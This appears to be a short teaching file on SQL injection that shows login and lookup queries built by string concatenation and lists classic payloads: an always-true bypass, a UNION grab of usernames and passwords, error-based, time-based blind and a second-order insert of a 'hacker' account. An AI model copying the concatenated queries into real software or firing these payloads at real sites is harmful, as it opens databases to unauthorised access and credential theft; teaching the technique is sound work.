# SQL Injection
# SQL injection is a hacking method where attackers insert malicious code into SQL statements.

# It's commonly used to bypass authentication or retrieve sensitive data from databases.

txtUserId = getRequestString("UserId")
txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId

uName = getRequestString("username")
uPass = getRequestString("userpassword")

sql = 'SELECT * FROM Users WHERE Name ="' + uName + '" AND Pass ="' + uPass + '"'

# SQL Injection Examples

# Simple SQL Injection:
simple_sql_injection = "' OR '1'='1"

# This input bypasses authentication by making the query always evaluate to true.

# Union-Based SQL Injection:
union_based_sql_injection = "' UNION SELECT username, password FROM users --"

# This input retrieves sensitive data like usernames and passwords.

# Error-Based SQL Injection:
error_based_sql_injection = "' AND 1=CONVERT(int, (SELECT @@version)) --"

# This input extracts database information through error messages.

# Blind SQL Injection (Time-Based):
blind_sql_injection = "' OR SLEEP(5) --"

# This input infers database information based on response times.

# Second-Order SQL Injection:
second_order_sql_injection = "'); INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"

# This input inserts malicious code into the database for later execution.
